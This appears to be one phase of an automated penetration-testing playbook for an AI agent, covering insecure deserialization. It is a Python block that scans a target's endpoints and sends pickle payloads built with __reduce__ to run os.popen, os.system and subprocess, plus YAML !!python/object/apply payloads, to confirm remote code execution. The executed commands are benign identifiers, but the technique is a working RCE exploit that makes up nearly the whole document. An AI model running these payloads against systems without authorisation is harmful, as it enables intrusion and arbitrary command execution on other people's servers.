**Phase 13 — Insecure Deserialization**

  Auto-discover pickle/YAML endpoints and test for RCE. Run as ONE complete block.
  ```python
  import time, re, base64, pickle
  from urllib.parse import urljoin

  BASE    = _G['BASE']
  session = _G.get('session_a') or _G.get('session')
  AUTH_PAGES = _G.get('AUTH_PAGES', {})
  ALL_PAGES  = _G.get('ALL_PAGES', {})

  # Paths commonly used for deserialization endpoints
  DESER_PATHS = ['/deserialize', '/api/deserialize', '/import', '/import-data',
                 '/load', '/api/load', '/upload', '/api/upload',
                 '/pickle', '/unpickle', '/api/import', '/data',
                 '/transfer', '/restore', '/api/restore', '/yaml',
                 '/api/yaml', '/config/import', '/api/config']

  # Params that accept serialized data
  DESER_PARAMS = ['data', 'payload', 'input', 'obj', 'object', 'pickle',
                  'serialized', 'import', 'content', 'body', 'config', 'yaml']

  # Safe detection payloads (no RCE — just detect if deserialization happens)
  # Pickle: serialize a simple object and check if server processes it without error
  class _SafeProbe:
      def __init__(self):
          self.marker = 'DESER_PROBE_OK'
  _safe_pickle = base64.b64encode(pickle.dumps(_SafeProbe())).decode()
  _safe_pickle_list = base64.b64encode(pickle.dumps([1, 2, 3])).decode()

  # Dangerous pickle probes — multiple output formats to catch different responses
  class _RCEProbe_id:
      def __reduce__(self):
          import os
          return (os.popen, ('id',))
  _rce_pickle = base64.b64encode(pickle.dumps(_RCEProbe_id())).decode()

  class _RCEProbe_echo:
      def __reduce__(self):
          import os
          return (os.system, ('echo PICKLE_RCE_CONFIRMED_12345',))
  _rce_pickle_echo = base64.b64encode(pickle.dumps(_RCEProbe_echo())).decode()

  class _RCEProbe_whoami:
      def __reduce__(self):
          import subprocess
          return (subprocess.check_output, (['whoami'],))
  _rce_pickle_whoami = base64.b64encode(pickle.dumps(_RCEProbe_whoami())).decode()

  # YAML unsafe load payloads
  YAML_PAYLOADS = [
      '!!python/object/apply:os.popen ["id"]',
      '!!python/object/new:subprocess.check_output [["id"]]',
  ]

  deser_candidates = set()

  # 1. Probe known paths
  for path in DESER_PATHS:
      endpoint = BASE.rstrip('/') + path
      try:
          r = session.get(endpoint, timeout=6, allow_redirects=True)
          if r.status_code not in (404, 410):
              if 'login' in r.url and 'login' not in endpoint:
                  continue
              deser_candidates.add(endpoint)
              print(f"  [DESER] Live endpoint: {endpoint} ({r.status_code})")
      except Exception:
          pass

  # 2. Check crawled pages for deserialization-related forms/content
  for page_url, body in {**ALL_PAGES, **AUTH_PAGES}.items():
      body_lower = body.lower()
      if any(kw in body_lower for kw in ['pickle', 'deserializ', 'unpickle', 'yaml.load',
                                          'base64', 'serialized', 'marshal', 'readobject']):
          deser_candidates.add(page_url)

  deser_findings = []
  print(f"[DESER] Testing {len(deser_candidates)} candidate endpoints")

  for endpoint in sorted(deser_candidates):
      # Try POST with pickle payloads in various param names
      for param in DESER_PARAMS:
          time.sleep(0.3)

          # Test 1: Safe pickle — does server accept and process it?
          for payload_b64 in [_safe_pickle, _safe_pickle_list]:
              try:
                  r = session.post(endpoint, data={param: payload_b64}, timeout=10, verify=False)
              except Exception:
                  continue
              body_lower = r.text.lower()

              # Signs of pickle processing
              if r.status_code == 200 and 'error' not in body_lower[:200]:
                  print(f"  [WARN] {endpoint} param={param} accepted pickle data (HTTP 200, no error)")

                  # Confirmed — now test RCE payloads (try multiple)
                  for rce_label, rce_b64 in [('id', _rce_pickle), ('echo', _rce_pickle_echo), ('whoami', _rce_pickle_whoami)]:
                      time.sleep(0.3)
                      try:
                          r2 = session.post(endpoint, data={param: rce_b64}, timeout=10, verify=False)
                      except Exception:
                          continue
                      body2 = r2.text
                      # Check for ANY sign of command execution
                      rce_confirmed = False
                      evidence = ''
                      if re.search(r'uid=\d+', body2):
                          rce_confirmed = True
                          evidence = re.search(r'uid=.{0,50}', body2).group()
                      elif 'PICKLE_RCE_CONFIRMED_12345' in body2:
                          rce_confirmed = True
                          evidence = 'Echo marker found in response'
                      elif re.search(r'(root|www-data|nobody|[a-z_][a-z0-9_-]*)\n', body2):
                          rce_confirmed = True
                          evidence = f'whoami output: {body2.strip()[:100]}'
                      elif r2.status_code == 200 and body2 != r.text and len(body2.strip()) > 0:
                          # Response changed after RCE payload — possible blind RCE
                          if 'error' not in body2.lower()[:200] and 'traceback' not in body2.lower()[:200]:
                              print(f"  [WARN] Response changed with RCE payload ({rce_label}) — possible blind RCE")
                              print(f"  Safe response: {r.text[:150]}")
                              print(f"  RCE response:  {body2[:150]}")
                      if rce_confirmed:
                          print(f"[CRITICAL] Pickle RCE CONFIRMED: {endpoint} param={param} (via {rce_label})")
                          print(f"  Evidence: {evidence}")
                          deser_findings.append({'url': endpoint, 'param': param, 'type': 'pickle_rce',
                                                 'evidence': body2[:300]})
                          break
                  else:
                      continue
                  break
              elif 'unpickl' in body_lower or 'deserializ' in body_lower or 'pickle' in body_lower:
                  print(f"  [INFO] {endpoint} mentions pickle/deserialization in error — endpoint processes serialized data")

          # Test 2: YAML unsafe load
          for yaml_payload in YAML_PAYLOADS:
              time.sleep(0.3)
              for content_type in ['application/x-yaml', 'text/yaml', 'application/x-www-form-urlencoded']:
                  try:
                      if content_type == 'application/x-www-form-urlencoded':
                          r = session.post(endpoint, data={'data': yaml_payload, 'config': yaml_payload}, timeout=10, verify=False)
                      else:
                          r = session.post(endpoint, data=yaml_payload, headers={'Content-Type': content_type}, timeout=10, verify=False)
                  except Exception:
                      continue
                  if re.search(r'uid=\d+', r.text) or 'PICKLE_RCE_CONFIRMED' in r.text:
                      print(f"[CRITICAL] YAML deserialization RCE: {endpoint}")
                      print(f"  Payload: {yaml_payload}")
                      print(f"  Evidence: {r.text[:200]}")
                      deser_findings.append({'url': endpoint, 'type': 'yaml_rce',
                                             'payload': yaml_payload, 'evidence': r.text[:300]})
                      break

  # Test 3: Raw body POST (some endpoints accept raw pickle in body)
  for endpoint in sorted(deser_candidates):
      time.sleep(0.3)
      for rce_label, rce_b64 in [('id', _rce_pickle), ('echo', _rce_pickle_echo)]:
          try:
              r = session.post(endpoint, data=base64.b64decode(rce_b64),
                               headers={'Content-Type': 'application/octet-stream'}, timeout=10, verify=False)
              if re.search(r'uid=\d+', r.text) or 'PICKLE_RCE_CONFIRMED_12345' in r.text:
                  print(f"[CRITICAL] Raw pickle RCE: {endpoint} (via {rce_label})")
                  print(f"  Evidence: {r.text[:200]}")
                  deser_findings.append({'url': endpoint, 'type': 'raw_pickle_rce', 'evidence': r.text[:300]})
                  break
          except Exception:
              pass

  if deser_findings:
      _G.setdefault('FINDINGS', [])
      for df in deser_findings:
          _G['FINDINGS'].append({
          'severity': 'CRITICAL',
          'title': 'Insecure Deserialization',
          'url': df.get('url', ''),
          'method': 'POST',
          'param': df.get('param', ''),
          'payload': df.get('payload', ''),
          'evidence': df.get('evidence', ''),
          'impact': 'Remote code execution via insecure deserialization of user-controlled data',
          'remediation': 'Never deserialize untrusted data. Use safe serialization formats (JSON) and validate all input before processing.',
          'screenshot': ''
      })
      print(f"\n[CRITICAL] Deserialization RCE on {len(deser_findings)} endpoint(s)!")
  else:
      print("[INFO] No insecure deserialization detected")
  ```

```
AFTER RUNNING THIS BLOCK — MANDATORY:
1. For each confirmed deserialization finding, take a browser screenshot:
   browser_action(action="navigate", url="<vulnerable_url>")
   browser_action(action="screenshot", filename="deser_proof_<type>.png")
2. Update each finding's 'screenshot' field in _G['FINDINGS']
3. If the screenshot shows the payload was rejected → REMOVE the finding (false positive)
```
